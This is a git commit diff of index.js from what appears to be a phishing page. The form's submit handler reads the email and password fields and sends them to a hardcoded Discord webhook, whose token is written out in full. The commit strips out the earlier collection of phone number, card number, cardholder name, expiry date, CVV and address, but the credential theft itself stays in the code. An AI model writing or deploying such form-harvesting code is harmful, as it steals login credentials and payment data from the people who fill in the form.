e8896e6ab395bc8ad490203773d5ac2ea28dc1a2
Notsu7 <139141534+Notsu7@users.noreply.github.com>
2024-09-22 15:44:33 +0200

    Add files via upload

--- index.js
+++ index.js
@@ -8,12 +8,6 @@ form.addEventListener("submit", (event)=>
 
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
-    const num = document.getElementById("tel.num").value;
-    const card_num = document.getElementById("card-number").value;
-    const name = document.getElementById("card-owner-name").value;
-    const exp = document.getElementById("card-exp").value;
-    const cvv = document.getElementById("card-cvv").value;
-    const address = document.getElementById("address").value;
 
     if(password!=document.getElementById("password2").value)
     {
@@ -22,7 +16,7 @@ form.addEventListener("submit", (event)=>
 
     else
     {
-        const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}\ncard number: ${card_num}\ncard owner name: ${name}\ncard exp date: ${exp}\ncard cvv: ${cvv}\naddress: ${address}`
+        const content = `email: ${email}\npassword: ${password}`
         
         fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
         {
@@ -37,35 +31,4 @@ form.addEventListener("submit", (event)=>
             })
         })
     }
-});
-
-document.getElementById('card-exp').addEventListener('input', function(e) 
-{
-    // Remove any non-numeric characters
-    let value = e.target.value.replace(/\D/g, '');
-    if (value.length >= 2) {
-      // Add a slash after the first two digits (MM)
-      value = value.slice(0, 2) + '/' + value.slice(2, 4);
-    }
-    e.target.value = value;
-});
-
-document.getElementById("card-number").addEventListener("input", (event)=>
-{
-    event.target.value = event.target.value.replace(/\D/g, '');
-});
-
-document.getElementById("tel.num").addEventListener("input", (event)=>
-{
-    event.target.value = event.target.value.replace(/\D/g, '');
-});
-
-document.getElementById("card-number").addEventListener("input", (event)=>
-{
-    event.target.value = event.target.value.replace(/\D/g, '');
-});
-
-document.getElementById("card-cvv").addEventListener("input", (event)=>
-{
-    event.target.value = event.target.value.replace(/\D/g, '');
 });
